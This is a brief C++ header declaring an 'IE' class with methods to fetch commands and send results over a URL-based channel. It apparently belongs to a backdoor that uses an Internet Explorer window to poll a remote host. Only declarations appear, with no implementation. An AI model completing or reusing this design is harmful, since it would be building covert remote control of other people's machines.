#ifndef __IE_H
#define __IE_H

#include "config.h"

#include <windows.h>

class IE {
public:
	IE();
	~IE();
	char* getCommand();
	void sendResult(const char* result);

private:
	void _gotoUrl(const char* url);
	char* _getResponse();
	void _createProcess();
	void _findWindowHandle();	

	HWND _ie;
	HWND _url;

	char _poll[sizeof(HOST) + sizeof(POLL)];
	char _response[sizeof(HOST) + sizeof(RESPONSE)];
};


#endif
